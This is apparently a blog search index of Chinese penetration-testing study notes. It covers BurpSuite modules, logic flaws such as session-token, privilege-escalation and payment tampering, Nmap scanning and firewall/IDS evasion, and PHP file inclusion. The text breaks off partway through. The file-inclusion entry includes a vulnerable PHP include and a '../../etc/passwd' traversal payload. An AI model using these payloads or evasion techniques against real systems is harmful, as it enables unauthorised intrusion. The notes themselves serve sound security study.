<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BurpSuite</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite/</url>
    
    <content type="html"><![CDATA[<h1 id="burp介绍">1. Burp介绍</h1><p><strong>简介：</strong></p><p>BurpSuite（简称Burp）是基于Java开发的Web安全领域的集成工具，被称为信息安全界的瑞士军刀，它包含Proxy、Intruder、Repeater、Decoder、Comparer等多个模块，模块间通过共享相互传递HTTP/HTTPS消息数据包。</p><p><strong>插件：</strong></p><p>BurpSuite可以使用三种语言编写的扩展插件：Java，Python和Ruby。除Java外，其它两种需要的扩展插件需要置运行环境。</p><h1 id="burp功能模块">2. Burp功能模块</h1><ul><li>Target：显示目标目录结构的一个功能</li><li>Proxy：Proxy以拦截代理的方式，拦截所有通过代理的HTTP和HTTPS协议的流量。通过拦截，BurpSuite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估测试的目的。</li><li>lntruder：lntruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。</li><li>Repeater：作为BurpSuite中一款手工验证HTTP消息的测试工具，Repeater通常用于多次重放请求响应和手工修改请求消息及修改后对服务器端响应的消息分析。</li><li>Sequencer：作为BurpSuite中一款用于检测数据样本随机性质量的工具，Sequencer通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</li><li>Decoder：作为BurpSuite中一款编码解码工具，Decoder的功能比较简单，它能对原始数据进行各种编码格式和散列的转换。</li><li>Comparer：Comparer在BurpSuite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。</li></ul><h1 id="proxy模块">3. Proxy模块</h1><p><strong>HTTP报文抓取与修改：</strong></p><ol type="1"><li>设置BurpSuite代理服务端口</li><li>设置FireFox浏览器代理端口</li><li>抓取HTTP请求报文</li></ol><p><strong>HTTPS报文抓取与修改：</strong></p><ol type="1"><li>设置BurpSuite代理服务端口</li><li>设置FireFox浏览器代理端口</li><li>下载CA证书<code>http://burp</code></li><li>浏览器中导入CA证书</li><li>抓取HTTPS请求报文</li></ol><h1 id="repeater模块">4. Repeater模块</h1><ul><li>修改请求参数，验证输入的漏洞</li><li>修改请求参数，验证逻辑越权</li><li>从拦截历史记录中，捕获特征性的请求消息进行请求重放</li></ul><h1 id="intruder模块">5. Intruder模块</h1><p><strong>攻击模式：</strong></p><ul><li>狙手模式（Sniper）：单payload位置，单payload集合，简单替换，若有多个payload位置，则会在每一个位置上遍历一次payload集合。</li><li>攻城锤模式（Batteringram）：多payload位置，单payload集合，在多个位置上使用相同的payload。</li><li>草叉模式（Pitchfork)︰多payload位置，多payload集合，在每个payload位置上遍历对应的payload集合，攻击次数为最短的payload集合的元素个数。</li><li>集束炸弹模式（Clusterbomb）：多payload位置，多payload集合，以多个payload集合的笛卡尔积作为攻击序列。如第一个位置的payload集合是{A,B}，第二格位置的payload集合是{C,D}，则攻击序列为{&lt;A,C&gt;，&lt;A,D&gt;,&lt;B,C&gt;，B,D&gt;}</li></ul><p><strong>payload类型:</strong></p><ul><li>简单列表（Simplelist）：最简单的payload类型，配置一个字符串列表作为payload，也可以手工添加字符串列表或从文件加载字符串列表。</li><li>运行时文件（Runtimefile）：指定文件，作为相对应payload位置上的payload列表。</li><li>自定义迭代器(Customiterator)：它共有8个占位，每个占位可以定义一个简单列表，最终所使用的payload为每一个占位的简单列表的笛卡儿积。</li><li>字符串替换（Charactersubstitution)：对预定义的字符串进行“枚举替换”后生成新的payload。</li><li>递归提取(Recursivegrep）：从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为payload，然后替换payload的位置，进行攻击。递归的配置需要进入Options-&gt;Grep-&gt;Extract进行配置；使用该模式时，线程数必须为1。</li><li>字符块（Characterblocks）︰：使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。</li><li>数字类型（Number)：根据配置，生成一系列的数字作为payload。</li><li>日期类型（Dates）:根据配置，生成一系列的日期。</li><li>暴力字典（Bruteforcer）:生成包含一个指定的字符集的所有排列特定长的有效载荷，通常用于枚举字典的生成。</li><li>空类型(Null payloads）︰产生的payload其值是一个空字符串。</li><li>payload复制（Copy otherpayload）:这种类型的payload是将其他位置的参数复制到payload位置上。</li></ul><p><strong>Option子选项卡：</strong></p><ul><li>请求消息头设置(Request Headers）</li><li>请求引擎设置（Request Engine)</li><li>攻击结果设置（Attack Results）</li><li>正则匹配（Grep Match)</li><li>正则提取（Grep Extract)</li><li>正则匹配payload（Grep payloads）</li><li>重定向(Redirections）</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞">0. 逻辑漏洞</h1><h2 id="访问控制概述">0.1 访问控制概述</h2><ul><li>访问控制(AccessControl）指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段。通常用于系统管理员控制用户对服务器、目录、文件等网络资源的访问。访问控制是系统保密性、完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一，也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</li><li>三要素：<strong>主体、客体、访问策略</strong></li><li>主体访问客体通常需要4个步骤：<strong>身份标识、身份验证、授权、审计</strong></li><li>访问控制模型：<ul><li>自主访问控制（Discretionary AccessControl，DAC，大部分使用）：由客体的属主自主的对客体进行管理，自主的决定是否将访问权限授予其他主体。</li><li>强制访问控制(Mandatory AccessControl，MAC)：安全策略由管理员配置，访问控制由系统实施，安全策略高于一切的存在。</li><li>角色型访问控制（Role-BasedAccessControl，RBAC）：根据不同的职位来分配不同的角色</li></ul></li></ul><h2 id="逻辑漏洞概述">0.2 逻辑漏洞概述</h2><ul><li>相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测;所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题。</li><li>逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。</li><li>由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止。</li></ul><h2 id="逻辑漏洞分类">0.3 逻辑漏洞分类</h2><ul><li>验证机制缺陷</li><li>会话管理缺陷</li><li>权限管理缺陷</li><li>业务逻辑缺陷</li></ul><h1 id="验证机制">1. 验证机制</h1><h2 id="概述">1.1 概述</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007386.png"alt="image-20231103151202542" /><figcaption aria-hidden="true">image-20231103151202542</figcaption></figure><ul><li>验证机制是应用程序防御恶意攻击的<strong>中心机制</strong>。验证机制最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误则拒绝用户登录。</li></ul><h2 id="验证机制设计缺陷">1.2 验证机制设计缺陷</h2><ul><li><p>可预测的用户名</p></li><li><p>非唯一性用户名</p></li><li><p>弱口令</p></li><li><p>密码确认不完善</p></li><li><p>可预测的密码</p></li><li><p>暴力破解</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007388.png"alt="image-20231103152006342" /><figcaption aria-hidden="true">image-20231103152006342</figcaption></figure><ul><li><p>页面在设置用户名和密码的时候，没有遵循密码设置规则，使用字典暴力破解，对暴破的结果根据长度进行分析，长度值与其他不同的就是正确结果，从而绕过登录验证机制</p></li><li><p>在遇到登录页面增加有验证码验证，首先判断是前端验证还是后端验证，前端设置的验证码如同虚设，就可以略过验证码，直接使用字典暴力破解（验证码输入错误时，无法抓取到数据包，只有验证码输入正确时才能抓到数据包，由此可以判断验证码的验证逻辑在前端；或直接查看页面源码）</p></li><li><p>服务端验证码常见问题：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1、验证码不生效，导致验证码的验证逻辑无效<br>2、验证码不过期，导致验证码不失效，可以长期使用<br>3、验证码设计太简单以及有规律，可以被预测、猜解<br>4、验证码校验不严格，验证逻辑出现问题<br></code></pre></td></tr></table></figure></li></ul></li><li><p>密码重置(修改密码、找回密码)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>常见密码重置问题:<br><span class="hljs-number">1</span>、用户名枚举：网站反馈多余信息，可猜测用户信息<br><span class="hljs-number">2</span>、验码返回前端处理：可截获、修改<br><span class="hljs-number">3</span>、修改Request：用户名、手机号、邮箱、Cookie等信息可修改<br><span class="hljs-number">4</span>、修改Response：操作结果成功/失败可修改<br><span class="hljs-number">5</span>、暴力破解验证码：验证码长度有限，或验证码未设置可靠的失效时间<br><span class="hljs-number">6</span>、拼凑密码重置链接：重置密码链接有规可循<br></code></pre></td></tr></table></figure></li><li><p>记住密码</p></li><li><p>证书分配不安全</p></li><li><p>证书传输易受攻击</p></li></ul><h2 id="验证机制执行缺陷">1.3 验证机制执行缺陷</h2><ul><li>异常开放登录机制</li><li>多阶段登录机制中的缺陷</li></ul><h1 id="会话管理">2. 会话管理</h1><h2 id="会话令牌">2.1 会话令牌</h2><ul><li>会话：用户登录成功后为其建立一个会话，通过会话记录用户的各种状态，通常使用Cookie、Session及，Token实现会话机制。</li><li>cookie的属性值expires，就是用于设置cookie过期时间，如果设置一个时间，到期后cookie则失效，如果默认不设置，则为浏览器关闭后cookie失效。</li><li>执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标识符，用户在每一个请求中提交这个令牌。</li></ul><h2 id="令牌有含义">2.2 令牌有含义</h2><p>我们常规抓取http数据包所观察到的令牌内容多是杂乱无序的字符串，不同用户之 间的令牌也无任何规律。但是也不排除有些系统会有意设置具有含义的令牌字符。</p><h2 id="令牌可预测">2.3 令牌可预测</h2><ul><li>隐含序列</li><li>时间依赖</li><li>生成的数字随机性不强</li><li>令牌加密函数对外开放或暴露</li></ul><h2 id="令牌可获取">2.4 令牌可获取</h2><ul><li>在网络上泄露令牌：使用HTTP协议</li><li>在日志中泄露令牌：协助网络管理人员的系统日志如果记录了最近的会话日志，且未对访问控制进行严格管理，那么在此种情况下，攻击者可能通过日志获得登录会话</li><li>会话令牌与会话的映射易受到攻击：运行并行登录；使用静态令牌，即一个用户令牌发布后不再改变</li><li>客户端暴露在令牌劫持风险中：XSS；CSRF；会话固定</li></ul><h2 id="令牌不失效">2.5 令牌不失效</h2><ul><li>令牌有效期过长</li><li>令牌尝试次数过多</li><li>无效的令牌重置的手段</li></ul><h1 id="权限控制">3. 权限控制</h1><h2 id="概述-1">3.1 概述</h2><ul><li>定义：某个主体(subject)对某个客体（object)需要实施某种操作（operation），系统对这种操作的限制就是权限控制。</li><li>权限控制一般分为两个步骤：<strong>身份验证</strong>与<strong>授权</strong>。首先进行的是身份验证的工作，用于验证用户是谁，是否有资格登录访问系统，解决【Whoaml】的问题;第二步进行授权，用来决定用户能做什么，将系统不同的权限授予不同的账户，使其登录系统后拥有不同的操作权限，解决【Whatcan l do】的问题。</li><li>权限控制方式：<ul><li>ACL：访问控制列表</li><li>RBAC：基于角色的访问控制</li></ul></li><li>权限控制问题：<ul><li>未授权访问</li><li>越权访问</li></ul></li></ul><h2 id="未授权访问">3.2 未授权访问</h2><h3 id="概述-2">3.2.1 概述</h3><ul><li><p>当信息系统的安全配置或权限认证的地址、授权页面存在缺陷时，有可能出现未授权访问，导致用户可以访问信息系统，进而操作重要权限、操作数据库、读取网站目录等敏感信息。</p></li><li><p>对于Web应用程序，未授权访问常发生于空口令登录及后台管理页面的访问；对于数据库或一些服务组件，未授权访问可能由于一些版本中出现的漏洞，导致攻击者能读取数据库信息，读取系统的文件，甚至利用服务写文件至主机上。</p></li></ul><h3 id="解决方案">3.2.2 解决方案</h3><ul><li>隐藏:只能阻止用户无法猜测到后台界面，爆破工具可以扫描大量后台地址</li><li>页面权限控制:可以阻挡非认证用户登录后台，即使找到后台链接，也会被认证窗口阻拦</li></ul><h2 id="越权访问">3.3 越权访问</h2><ul><li><p>由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。</p></li><li><p>按数据库操作分类：</p><ul><li>越权查询</li><li>越权删除</li><li>越权修改</li><li>越权添加</li></ul></li><li><p>按维度分类：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007389.png"alt="image-20231103171404099" /><figcaption aria-hidden="true">image-20231103171404099</figcaption></figure><ul><li>平行越权(权限类型不变，权限ID改变)：攻击者尝试访问与其具有相同级别的用户资源</li><li>垂直越权(权限ID不变，权限类型改变)：低级别攻击者尝试访问高级别用户的资源</li><li>交叉越权（权限类型改变，权限ID也改变)</li></ul></li></ul><h3 id="水平越权">3.3.1 水平越权</h3><ul><li>水平越权也叫横向越权，相同权限下不同的用户可以互相访问，比如A和B是相同权限下的用户，如果A能看到理论上只有B能看到的信息，或者A能执行理论上只有B能执行的操作，这就是水平越权。</li><li>实例：使用lucy账户登录，查看lucy用户的个人信息，通过修改username的值为其他用户名，实现查看其他用户的个人信息，成功水平越权。</li></ul><h3 id="垂直越权">3.3.2 垂直越权</h3><ul><li>垂直越权也叫纵向越权，使用权限低的用户可以访问到权限较高的用户。比如A用户权限比B低，如果A可以访问理论上只有B才能访问的资源，或者执行理论上B才能执行的操作，这就是垂直越权。</li><li>垂直越权原理为高权限角色访问低权限角色的资源往往是被允许的，低权限角色访问高权限角色资源是被禁止的，如果低权限角色通过访问URL、修改标识、遍历参数等方法获得了更高权限角色的能力，这样就发生了垂直越权访问。</li></ul><h3 id="解决方案-1">3.3.3 解决方案</h3><ul><li>垂直越权：设置合适的会话管理机制，在每个涉及到高权限操作的页面进行会话验证</li><li>水平越权：<ul><li>设置合理的会话管理机制，将有关用户的标识存在服务器上</li><li>涉及到关于用户隐私的操作时，从session中取出用户标识(如id）进行操作</li><li>不要轻信用户的每个输入越权</li></ul></li></ul><h1 id="业务逻辑">4. 业务逻辑</h1><h2 id="概述-3">4.1 概述</h2><ul><li>不同的项目有不同的功能，不同的功能需要不同的实现，实现这些核心功能的代码就叫业务逻辑。</li><li>业务是指一个实体单元向另一个实体单元提供的服务。逻辑是指根据已有的信息推出合理的结论的规律。业务逻辑是指一个实体单元为了向另一个实体单元提供服务，应该具备的规则与流程。</li><li>内容：<ul><li>领域实体:定义了业务中的对象，对象有属性和行为</li><li>业务规则:定义了需要完成一个动作，必须满足的条件</li><li>数据完整性:某些数据不可少</li><li>工作流:定义了领域实体之间的交互关系</li></ul></li><li>业务逻辑漏洞：是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。</li></ul><h2 id="支付逻辑漏洞">4.2 支付逻辑漏洞</h2><ul><li>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞。支付漏洞一直以来就是高风险漏洞，对用户和企业的危害都很大。网上购物的整体流程为：搜索-&gt; 挑选商品 -&gt; 下单购买 -&gt; 付款 -&gt;发货。在系统的支付流程中，由于开发者在编写购物程序时，对客户端请求数据中金额、单价、数量、商品编号等敏感信息的逻辑处理不当，攻击者利用目标网站本身的逻辑问题，造成商家的经济损失，导致产生支付逻辑漏洞。常见情况：<ul><li>支付过程中修改支付金额</li><li>支付过程中修改商品数量</li><li>支付过程中修改商品编号</li><li>支付过程中修改商品单价</li></ul></li><li>预防思路：多重校验；人工审核（大金额订单）</li></ul><h2 id="其他业务逻辑问题">4.3 其他业务逻辑问题</h2><ul><li><p>APl逻辑漏洞：参数校验不完善；短信、邮箱炸弹；关键参数不加密</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007390.png"alt="image-20231103174441951" /><figcaption aria-hidden="true">image-20231103174441951</figcaption></figure></li><li><p>客户端与API通信无加密：未加密风险；中间人攻击</p></li><li><p>客户端与API通信无身份验证：信息泄露；应用程序被克隆；难以应对大规模拒绝服务攻击</p></li><li><p>其他安全问题：短信炸弹；重复下单（均属于重复攻击模式）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007391.png"alt="image-20231103174840365" /><figcaption aria-hidden="true">image-20231103174840365</figcaption></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmap</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap/</url>
    
    <content type="html"><![CDATA[<h1 id="nmap介绍">1. Nmap介绍</h1><p><strong>简介：</strong></p><ul><li>Nmap是Linux下一款开源免费的网络发现（NetworkDiscovery）和安全审计（Security Auditing）工具，软件名字Nmap是NetworkMapper的简称。</li><li>Nmap使用原始IP报文来发现网络上有哪些主机，这些主机提供什么服务（应用程序名和版本），服务运行在什么操作系统，它们使用什么类型的报文过滤器/防火墙，以及一些其他功能。</li></ul><p><strong>功能：</strong></p><ul><li>主机发现</li><li>端口扫描</li><li>应用程序与版本信息侦测</li><li>操作系统侦测</li><li>规避FW/IDS</li><li>NSE脚本定制与使用</li></ul><p><strong>Nmap命令语法格式：</strong><code>nmap【空格】【选项|多选项|协议】【空格】【扫描目标说明】</code></p><p><strong>常用命令：</strong></p><ul><li>默认扫描：<code>nmap &lt;目标地址&gt;</code></li><li>全面扫描：<code>nmap -A -T 4 -V &lt;目标地址&gt;</code></li></ul><h1 id="主机发现">2. 主机发现</h1><p><strong>目标：</strong></p><p>确定目标主机是否在线(Alive，处于开启状态）</p><p><strong>原理：</strong></p><p>与ping命令类似，发送探测包到目标主机，如果收到回复，则说明目标主机是开启的</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542942.png"alt="image-20231113150045493" /><figcaption aria-hidden="true">image-20231113150045493</figcaption></figure><p><strong>说明：</strong></p><ul><li>局域网内执行ping扫描：在局域网内，无论采用哪一种选项，Nmap都是通过<strong>ARP</strong>包来询问IP地址上的主机是否活动的，如果收到ARP回复包，那么说明主机在线。</li><li>跨网段执行ping扫描：扫描跨网段目标主机时，使用-sP或-sn选项，默认情况下Nmap会依次发送4种不同类型的数据包(ICMPecho request、TCP SYN packet to port 443、TCP ACK packet to port80、ICMP timestamprequest）来探测目标主机是否在线，只要收到其中一个包的回复，就证明目标机在线。</li></ul><h1 id="端口扫描">3. 端口扫描</h1><p><strong>目标：</strong></p><p>确定目标主机的TCP/UDP端口的开放情况</p><p><strong>原理：</strong></p><p>发送TCP、UDP等类型的探测包到目标端口，根据收到的回复包判定端口是否开放</p><p><strong>端口的六个状态：</strong></p><ul><li>open:端口是开放的</li><li>closed:端口是关闭的</li><li>filtered:端口被防火墙IDS/IPS屏蔽，无法确定其状态</li><li>unfiltered:端口没有被屏蔽，但是否开放需要进一步确定</li><li>open|filtered:端口是开放的或被屏蔽</li><li>closed|filtered︰端口是关闭的或被屏蔽</li></ul><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542943.png"alt="image-20231113150721479" /><figcaption aria-hidden="true">image-20231113150721479</figcaption></figure><p><strong>说明：</strong></p><p>关于-p选项的说明：默认情况下，Nmap仅对用-p指定的TCP端口进行扫描，扫描方式为-sS(TCPSYN扫描）。如果既要扫描TCP端口，又要扫描UDP端口，则可以用“T:““U:”参数指定目标端口，并指定-sU(UDP扫描方式）和至少—种TCP扫描方式，如：<code>nmap-p T:139,U:53 -sS -sU 192.168.40.178</code></p><h2 id="tcp-syn扫描原理">3.1 TCP SYN扫描原理</h2><p>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机发送TCPRST报文以重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542944.png"alt="image-20231113151244885" /><figcaption aria-hidden="true">image-20231113151244885</figcaption></figure><h2 id="tcp-connect扫描原理">3.2 TCP connect扫描原理</h2><p>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机依次发送TCPACK、TCP RST+ACK完成三次握手和重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542945.png"alt="image-20231113151504128" /><figcaption aria-hidden="true">image-20231113151504128</figcaption></figure><h2 id="tcp-ack扫描原理">3.3 TCP ACK扫描原理</h2><p>Nmap向目标端口发送TCPACK报文，无论目标端口是否处于开放状态，目标机都会返回TCPRST报文。如果Nmap主机能收到此TCPRST报文，则说明目标端口未被防火墙屏蔽。TCPACK扫描只能用于确定防火墙是否屏蔽某个端口，可以辅助TCPSYN的方式来判断目标主机防火墙的状况。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542946.png"alt="image-20231113151735708" /><figcaption aria-hidden="true">image-20231113151735708</figcaption></figure><h2 id="隐蔽扫描原理">3.4 隐蔽扫描原理</h2><ul><li>Nmap向目标端口发送TCPFIN(-SF）/NULL（sN）/FIN+PSH+URG（-sX）报文，对于Linux系统的目标机，如果目标机未响应，则说明目标端口处于开放状态或被防火墙屏蔽;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</li><li>对于Windows系统的目标机，无论目标端口处于开放还是关闭状态，目标机都会返回TCPRST+ACK报文。</li><li>因此，隐蔽扫描方式适合于Linux系统的目标机端口扫描。</li></ul><h1 id="应用程序与版本信息侦测">4. 应用程序与版本信息侦测</h1><p><strong>目标：</strong></p><p>识别目标主机开放的TCP/UDP端口上运行的服务及版本信息</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542947.png"alt="image-20231113152420343" /><figcaption aria-hidden="true">image-20231113152420343</figcaption></figure><h1 id="操作系统侦测">5. 操作系统侦测</h1><p><strong>目标：</strong></p><p>识别目标主机操作系统的类型</p><p><strong>侦测方法：</strong></p><p>网络协议栈指纹识别技术</p><p><strong>常用的网络协议栈指绞识别方法：</strong></p><ul><li>TTL</li><li>DF位</li><li>Window Size</li><li>ACK序号</li><li>对FIN包的响应</li><li>ISN</li><li>主机使用的端口</li></ul><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542948.png"alt="image-20231113152759394" /><figcaption aria-hidden="true">image-20231113152759394</figcaption></figure><h1 id="规避fwids">6. 规避FW/IDS</h1><p><strong>目标：</strong></p><p>绕过目标主机的防火墙、入侵检测系统等防护手段</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542949.png"alt="image-20231113152959757" /><figcaption aria-hidden="true">image-20231113152959757</figcaption></figure><p><strong>说明：</strong></p><ul><li>使用-T（0~5）可以启用时序选项，一般来说，数字越大，速度越快，精度越低，默认值为3。</li><li>--spoof-mac选项：<code>nmap--spoof-mac 0 &lt;目标IP&gt;</code>，其中参数0表示随机分配一个MAC地址，也可以手动指定MAC地址。</li></ul><h1 id="nes脚本的简单应用">7. NES脚本的简单应用</h1><ul><li><p>除了常规的网络扫描，Nmap还可根据NSE(Nmap scriptingEngine）的脚本进行大量渗透工作，这种脚本基于Lua语言编写。</p></li><li><p>脚本存放自录:<code>/usr/share/nmap/scripts/</code></p></li><li><p>命令选项：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542950.png"alt="image-20231113153503619" /><figcaption aria-hidden="true">image-20231113153503619</figcaption></figure></li></ul><h1 id="扫描结果保存与输出">8. 扫描结果保存与输出</h1><ul><li>normal:标准模式（选项-oN）</li><li>xml文档:(选项-oX)</li><li>grep文件(选项-oG）</li><li>-oA选项可将扫描结果以标准格式、XML、Grep格式一次性全部保存</li><li><code>nmap -sS -oN out.txt 192.168.40.182</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/11/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/11/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含概述">1. 文件包含概述</h1><h2 id="原理">1.1 原理</h2><ul><li><p>文件包含：把可重复使用的函数写入到单个文件中，在需要使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</p></li><li><p>文件包含漏洞原理：和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其<strong>本质</strong>就是输入一段用户能够控制的脚本或者代码，并让服务端执行。有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p></li><li><p>注：几乎所有的脚本语言都会提供文件包含的功能，但文件包含漏洞在PHPwebApplication中居多，而在JSP、ASP、ASP.NET程序中却非常少，这是有些语言设计的弊端。在PHP中经常出现文件包含漏洞，但并不意味着其他语言不存在。</p></li></ul><h2 id="文件包含函数">1.2 文件包含函数</h2><ul><li>require():找不到被包含的文件会产生<strong>致命错误</strong>，并停止脚本运行</li><li>include():找不到被包含的文件只会产生<strong>警告</strong>，脚本继续执行</li><li>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li><li>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li></ul><p>注：PHP文件包含漏洞在利用时无视后缀名，任何扩展名的文件都可以被PHP解析器解析。</p><h2 id="利用条件">1.3 利用条件</h2><ul><li>include等函数通过动态执行变量的方式引入需要包含的文件</li><li>用户能控制该动态变量</li></ul><h1 id="php文件包含漏洞分类">2. PHP文件包含漏洞分类</h1><ul><li>文件包含漏洞可以分为LFI（LocalFilelnclusion，本地文件包含）和RFI（Remote Filelnclusion，远程文件包含）两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。</li><li>远程文件包含需要php.ini中alow_url_include=on，allow_url_fopen=On。在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</li></ul><h2 id="本地文件包含漏洞lfi">2.1 本地文件包含漏洞(LFI)</h2><p><strong>定义</strong>：本地包含是包含目标服务器本地的文件，可以包含同目录下的文件：?file=test.txt；也可以进行目录遍历来读取文件：?file=./…/…/test.txt。</p><p><strong>读取方式：</strong></p><ul><li>绝对路径</li><li>相对路径：./表示当前目录，…/表示上一级目录</li></ul><p><strong>利用目录结构构造payload</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>file = _GET[‘file’];      <span class="hljs-comment">// “../../etc/passwd\0</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exisits</span>(‘/home/wwwrun/’.<span class="hljs-variable">$file</span>.’.php’)) &#123;<br>  <span class="hljs-comment">//file_exists will return true as the file/home/wwwrun/../../etc/passwd exists  </span><br>  Include‘/home/wwwrun/’.<span class="hljs-variable">$file</span>.’.php’;<br>  <span class="hljs-comment">// the file /etc/passwd will be included</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="远程文件包含漏洞rfi">2.2 